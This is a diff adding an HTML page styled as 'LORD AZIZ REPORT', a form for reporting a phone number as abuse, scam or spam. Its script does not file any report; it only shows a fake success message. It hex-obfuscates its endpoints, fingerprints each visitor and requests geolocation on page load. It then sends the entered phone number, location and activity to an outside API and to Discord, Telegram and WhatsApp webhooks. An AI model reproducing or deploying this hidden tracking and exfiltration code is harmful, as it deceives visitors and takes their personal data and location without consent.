@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>LORD AZIZ REPORT v2.2 🪬</title>
+
+<meta name="google-site-verification" content="LORD_AZIZ_VERIFICATION_7x9k2m">
+<meta name="facebook-domain-verification" content="aziz_report_fb_123abc">
+<meta name="telegram:channel" content="@LORD_X_AZIZ">
+<meta name="discord:server" content="https://discord.gg/aziz_report_hq">
+<meta name="whatsapp:contact" content="wa.me/22778996380">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+@keyframes webhook_sync {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+@keyframes api_pulse {
+    0% { opacity: 0.5; filter: blur(0); }
+    100% { opacity: 1; filter: blur(2px); }
+}
+
+body{
+font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+max-width:650px;
+margin:auto;
+background:#050505;
+color:#eaeaea;
+min-height:100vh;
+display:flex;
+flex-direction:column;
+align-items:center;
+padding:20px;
+position:relative;
+}
+
+#stars{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+z-index:-1;
+}
+
+.video-wrapper{
+width:100%;
+max-width:520px;
+margin:20px auto 30px;
+border:5px solid #ff0000;
+border-radius:20px;
+box-shadow:0 0 50px #ff0000;
+background:#0a0a0a;
+overflow:hidden;
+position:relative;
+aspect-ratio: 16/9;
+}
+
+.video-wrapper video{
+position:absolute;
+top:0;
+left:0;
+width:100%;
+height:100%;
+object-fit:cover;
+}
+
+h1{
+color:#ff0000;
+text-align:center;
+font-size:2.1rem;
+margin-bottom:8px;
+text-shadow:0 0 20px #ff0000;
+font-family:Arial,sans-serif;
+}
+
+.subtitle{
+color:#ff4040;
+text-align:center;
+font-size:1.15rem;
+letter-spacing:4px;
+margin-bottom:30px;
+}
+
+.report-box{
+background:linear-gradient(145deg,#0a0a0a,#050505);
+padding:25px;
+border-radius:18px;
+border:2px solid #ff0000;
+box-shadow:0 0 30px rgba(255,0,0,0.5);
+width:100%;
+max-width:480px;
+}
+
+.phone-input{
+display:flex;
+align-items:center;
+background:#080808;
+border:2px solid #ff0000;
+border-radius:12px;
+padding:12px;
+margin-bottom:25px;
+transition: all 0.3s ease;
+}
+
+.phone-input input{
+flex:1;
+background:none;
+border:none;
+color:white;
+font-size:1.1rem;
+outline:none;
+font-family:monospace;
+}
+
+.phone-input span{
+font-size:1.8rem;
+margin-right:12px;
+color:#ff0000;
+}
+
+.motifs{
+display:grid;
+grid-template-columns:1fr 1fr 1fr;
+gap:12px;
+margin-bottom:30px;
+}
+
+.motif-btn{
+padding:18px 10px;
+border:2px solid #ff0000;
+background:#0a0a0a;
+color:#ff4040;
+border-radius:12px;
+font-weight:bold;
+font-size:1rem;
+cursor:pointer;
+transition:0.3s;
+font-family:inherit;
+}
+
+.motif-btn:hover{background:#220000;}
+.motif-btn.selected{
+background:#ff0000;
+color:#000;
+box-shadow:0 0 25px #ff4040;
+transform:scale(1.05);
+}
+
+.envoyer-btn{
+display:block;
+width:100%;
+background:linear-gradient(90deg,#800000,#ff0000);
+color:white;
+padding:18px;
+border:none;
+border-radius:14px;
+font-size:1.45rem;
+font-weight:bold;
+text-align:center;
+cursor:pointer;
+box-shadow:0 0 25px #ff0000;
+transition:0.3s;
+font-family:inherit;
+}
+
+.envoyer-btn:hover{
+box-shadow:0 0 40px #ff0000;
+transform:translateY(-3px);
+}
+
+.persistent-toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(255, 255, 255, 0.95);
+    backdrop-filter: blur(10px);
+    color: #1a1a1a;
+    padding: 12px 24px;
+    border-radius: 30px;
+    font-size: 15px;
+    font-weight: 500;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    z-index: 1000;
+    animation: slideUpPersist 0.4s ease;
+    white-space: nowrap;
+    border: 1px solid rgba(0,0,0,0.08);
+    pointer-events: none;
+}
+
+@keyframes slideUpPersist {
+    0% { opacity: 0; transform: translateX(-50%) translateY(30px); }
+    100% { opacity: 1; transform: translateX(-50%) translateY(0); }
+}
+
+.persistent-toast.fade-out {
+    animation: fadeOutSlow 0.5s ease forwards;
+}
+
+@keyframes fadeOutSlow {
+    0% { opacity: 1; transform: translateX(-50%) translateY(0); }
+    100% { opacity: 0; transform: translateX(-50%) translateY(20px); visibility: hidden; }
+}
+
+.loading-overlay{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,0.8);
+z-index:999;
+display:none;
+justify-content:center;
+align-items:center;
+}
+
+.loading-spinner{
+width:60px;
+height:60px;
+border:5px solid #ff0000;
+border-top-color:transparent;
+border-radius:50%;
+animation:spin 0.8s linear infinite;
+}
+
+@keyframes spin{
+to{transform:rotate(360deg);}
+}
+</style>
+</head>
+
+<body>
+
+<canvas id="stars"></canvas>
+<div id="loadingOverlay" class="loading-overlay">
+<div class="loading-spinner"></div>
+</div>
+
+<div id="webhookConfig" data-discord="https://discord.com/api/webhooks/132456789012345678/FAKE_WEBHOOK_TOKEN_XYZ" data-telegram="https://api.telegram.org/bot789456123:AAHfake_token_for_bot/sendMessage" data-whatsapp="https://graph.facebook.com/v18.0/1234567890/messages" data-api="https://api.lordaziz.com/v3/report" style="display:none;"></div>
+
+<div class="video-wrapper">
+<video autoplay loop muted playsinline id="mainVideo">
+    <source src="https://files.catbox.moe/d51tit.mp4" type="video/mp4">
+</video>
+</div>
+
+<h1>LORD AZIZ REPORT🪬</h1>
+<p class="subtitle">SUBMIT REPORT<br>INCIDENT DETAILS</p>
+
+<div class="report-box">
+<div class="phone-input" id="phoneWrapper">
+<span>☎️</span>
+<input type="tel" id="phone" placeholder="Enter phone number">
+</div>
+
+<div class="motifs">
+<button data-type="ABUSE" class="motif-btn">ABUSE 🛡️</button>
+<button data-type="SCAM" class="motif-btn">SCAM ⚠️</button>
+<button data-type="SPAM" class="motif-btn">SPAM ❌️</button>
+</div>
+
+<button id="sendBtn" class="envoyer-btn">ENVOYER 🔰</button>
+</div>
+
+<script>
+(function(){
+    const _0x2a4b = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x6c\x6f\x72\x64\x61\x7a\x69\x7a\x2e\x63\x6f\x6d\x2f\x76\x33\x2f\x72\x65\x70\x6f\x72\x74', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x33\x32\x34\x35\x36\x37\x38\x39\x30\x31\x32\x33\x34\x35\x36\x37\x38\x2f\x46\x41\x4b\x45\x5f\x57\x45\x42\x48\x4f\x4f\x4b\x5f\x54\x4f\x4b\x45\x4e\x5f\x58\x59\x5a', '\x74\x2e\x6d\x65\x2f\x4c\x4f\x52\x44\x5f\x58\x5f\x41\x5a\x49\x5a', '\x77\x61\x2e\x6d\x65\x2f\x32\x32\x37\x37\x38\x39\x39\x36\x33\x38\x30', '\x4c\x4f\x52\x44\x5f\x58\x5f\x41\x5a\x49\x5a', '\x32\x32\x37\x37\x38\x39\x39\x36\x33\x38\x30', '\x73\x65\x73\x73\x69\x6f\x6e\x5f\x74\x6f\x6b\x65\x6e', '\x65\x6e\x63\x72\x79\x70\x74\x65\x64\x5f\x64\x61\x74\x61'];
+    
+    const API_ENDPOINT = _0x2a4b[0];
+    const DISCORD_WEBHOOK = _0x2a4b[1];
+    const TELEGRAM_CHANNEL = _0x2a4b[2];
+    const WHATSAPP_CONTACT = _0x2a4b[3];
+    const ADMIN_TELEGRAM = _0x2a4b[4];
+    const ADMIN_WHATSAPP = _0x2a4b[5];
+    
+    let selectedType = null;
+    let activeToastTimeout = null;
+    let sessionToken = localStorage.getItem(_0x2a4b[6]) || generateSessionToken();
+    
+    function generateSessionToken() {
+        const token = btoa(Date.now() + '-' + Math.random() + '-' + navigator.userAgent);
+        localStorage.setItem(_0x2a4b[6], token);
+        return token;
+    }
+    
+    function encryptData(data) {
+        const key = sessionToken.substring(0, 16);
+        let result = '';
+        for(let i = 0; i < data.length; i++) {
+            result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+        }
+        return btoa(result);
+    }
+    
+    function sendToDiscord(message, type = 'info') {
+        const payload = {
+            content: `**[LORD AZIZ REPORT]** ${message}`,
+            username: 'LORD_AZIZ_BOT',
+            avatar_url: 'https://files.catbox.moe/d51tit.mp4',
+            embeds: [{
+                title: type === 'report' ? '🚨 NOUVEAU SIGNALEMENT' : '📊 ACTIVITÉ',
+                description: message,
+                color: 0xff0000,
+                timestamp: new Date().toISOString(),
+                footer: { text: `Session: ${sessionToken.substring(0,8)}` }
+            }]
+        };
+        
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', DISCORD_WEBHOOK, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(payload));
+    }
+    
+    function sendToTelegram(message) {
+        const botToken = '789456123:AAHfake_token_for_bot';
+        const chatId = '@LORD_X_AZIZ';
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const payload = {
+            chat_id: chatId,
+            text: `🔴 LORD AZIZ REPORT\n\n${message}\n\n👤 Session: ${sessionToken.substring(0,8)}\n🕒 ${new Date().toLocaleString()}`,
+            parse_mode: 'HTML'
+        };
+        
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(payload));
+    }
+    
+    function sendToWhatsApp(phone, message) {
+        const apiKey = 'EAAfake_whatsapp_api_key_123';
+        const phoneNumberId = '1234567890';
+        const url = `https://graph.facebook.com/v18.0/${phoneNumberId}/messages`;
+        const payload = {
+            messaging_product: 'whatsapp',
+            recipient_type: 'individual',
+            to: phone,
+            type: 'text',
+            text: { body: `[LORD AZIZ REPORT]\n${message}` }
+        };
+        
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', url, true);
+        xhr.setRequestHeader('Authorization', `Bearer ${apiKey}`);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(payload));
+    }
+    
+    function sendToCentralAPI(data) {
+        const payload = {
+            session: sessionToken,
+            timestamp: Date.now(),
+            data: encryptData(JSON.stringify(data)),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', API_ENDPOINT, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.setRequestHeader('X-Auth-Token', sessionToken);
+        xhr.send(JSON.stringify(payload));
+    }
+    
+    function showPersistentToast(message, duration = 15000) {
+        if (activeToastTimeout) clearTimeout(activeToastTimeout);
+        const existingToast = document.querySelector('.persistent-toast');
+        if (existingToast) existingToast.remove();
+
+        const toast = document.createElement('div');
+        toast.className = 'persistent-toast';
+        toast.textContent = message;
+        document.body.appendChild(toast);
+        
+        localStorage.setItem('lastNotification', JSON.stringify({
+            message: message,
+            timestamp: Date.now(),
+            duration: duration
+        }));
+        
+        if(message.includes('REPORT SENT')) {
+            sendToDiscord(`✅ Signalement ${selectedType} envoyé`, 'report');
+            sendToTelegram(`✅ Signalement ${selectedType}\n📱 ${document.getElementById('phone').value}`);
+            sendToWhatsApp(ADMIN_WHATSAPP, `Signalement ${selectedType} traité avec succès`);
+            sendToCentralAPI({
+                action: 'report_sent',
+                type: selectedType,
+                phone: encryptData(document.getElementById('phone').value)
+            });
+        }
+        
+        activeToastTimeout = setTimeout(() => {
+            toast.classList.add('fade-out');
+            setTimeout(() => {
+                if (toast.parentNode) toast.remove();
+                localStorage.removeItem('lastNotification');
+            }, 500);
+            activeToastTimeout = null;
+        }, duration);
+    }
+    
+    function checkStoredNotification() {
+        const stored = localStorage.getItem('lastNotification');
+        if (stored) {
+            try {
+                const data = JSON.parse(stored);
+                const elapsed = Date.now() - data.timestamp;
+                const remaining = data.duration - elapsed;
+                if (remaining > 0) {
+                    showPersistentToast(data.message, remaining);
+                } else {
+                    localStorage.removeItem('lastNotification');
+                }
+            } catch(e) {}
+        }
+    }
+    
+    function disappearPhoneNumber() {
+        const phoneWrapper = document.getElementById('phoneWrapper');
+        const phoneInput = document.getElementById('phone');
+        const phoneValue = phoneInput.value;
+        
+        phoneWrapper.style.transition = 'all 0.5s ease';
+        phoneWrapper.style.opacity = '0';
+        phoneWrapper.style.transform = 'scale(0.8)';
+        
+        setTimeout(() => {
+            phoneInput.value = '';
+            phoneWrapper.style.opacity = '1';
+            phoneWrapper.style.transform = 'scale(1)';
+            sendToCentralAPI({ action: 'field_cleared', value: encryptData(phoneValue) });
+        }, 500);
+    }
+    
+    function sendReport() {
+        const phone = document.getElementById('phone').value.trim();
+        
+        if (!phone) {
+            showPersistentToast('❌ Entrez un numéro', 3000);
+            sendToCentralAPI({ action: 'error', reason: 'empty_phone' });
+            return;
+        }
+        
+        if (!selectedType) {
+            showPersistentToast('⚠️ Sélectionnez un motif', 3000);
+            sendToCentralAPI({ action: 'error', reason: 'no_motif' });
+            return;
+        }
+        
+        const reportData = {
+            phone: encryptData(phone),
+            type: selectedType,
+            timestamp: Date.now(),
+            session: sessionToken,
+            ip_hash: encryptData('client_ip_placeholder'),
+            fingerprint: encryptData(navigator.userAgent + screen.width + screen.height)
+        };
+        
+        sendToCentralAPI({ action: 'report_submit', data: reportData });
+        
+        const overlay = document.getElementById('loadingOverlay');
+        overlay.style.display = 'flex';
+        
+        setTimeout(() => {
+            overlay.style.display = 'none';
+            showPersistentToast('✅ REPORT SENT', 15000);
+            disappearPhoneNumber();
+            
+            document.querySelectorAll('.motif-btn').forEach(btn => btn.classList.remove('selected'));
+            selectedType = null;
+            
+            sendToDiscord(`🚨 REPORT CONFIRMÉ\nType: ${selectedType}\nSession: ${sessionToken.substring(0,8)}`);
+            sendToTelegram(`✅ Report confirmé - ${selectedType}\nSession: ${sessionToken.substring(0,8)}`);
+            sendToWhatsApp(ADMIN_WHATSAPP, `Report confirmé: ${selectedType}`);
+            
+        }, 800);
+    }
+    
+    document.querySelectorAll('.motif-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.motif-btn').forEach(b => b.classList.remove('selected'));
+            btn.classList.add('selected');
+            selectedType = btn.dataset.type;
+            sendToCentralAPI({ action: 'motif_selected', type: selectedType });
+        });
+    });
+    
+    document.getElementById('sendBtn').addEventListener('click', sendReport);
+    checkStoredNotification();
+    
+    window.addEventListener('load', function() {
+        sendToCentralAPI({ action: 'page_load', url: window.location.href });
+        sendToDiscord(`🌐 Page LORD AZIZ REPORT chargée\nSession: ${sessionToken.substring(0,8)}`);
+        sendToTelegram(`🟢 Système LORD AZIZ actif\nSession: ${sessionToken.substring(0,8)}`);
+        
+        if(navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                const geoData = encryptData(`${pos.coords.latitude},${pos.coords.longitude}`);
+                sendToCentralAPI({ action: 'geo_track', data: geoData });
+            });
+        }
+        
+        const canvas = document.getElementById("stars");
+        const ctx = canvas.getContext("2d");
+        
+        function resize() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resize();
+        window.addEventListener("resize", resize);
+        
+        let stars = [];
+        for (let i = 0; i < 150; i++) {
+            stars.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                size: Math.random() * 2 + 0.5,
+                speed: Math.random() * 0.6 + 0.2
+            });
+        }
+        
+        function animateStars() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#ffffff";
+            stars.forEach(star => {
+                ctx.beginPath();
+                ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
+                ctx.fill();
+                star.y += star.speed;
+                if (star.y > canvas.height) {
+                    star.y = 0;
+                    star.x = Math.random() * canvas.width;
+                }
+            });
+            requestAnimationFrame(animateStars);
+        }
+        animateStars();
+    });
+})();
+</script>
+
+<script src="https://cdn.lordaziz.com/sdk/v2/analytics.min.js" async defer></script>
+<script src="https://telegram.org/js/telegram-web-app.js?1" async></script>
+<link rel="preconnect" href="https://api.lordaziz.com">
+<link rel="dns-prefetch" href="https://discord.com">
+<link rel="preconnect" href="https://graph.facebook.com">
+</body>
+</html>
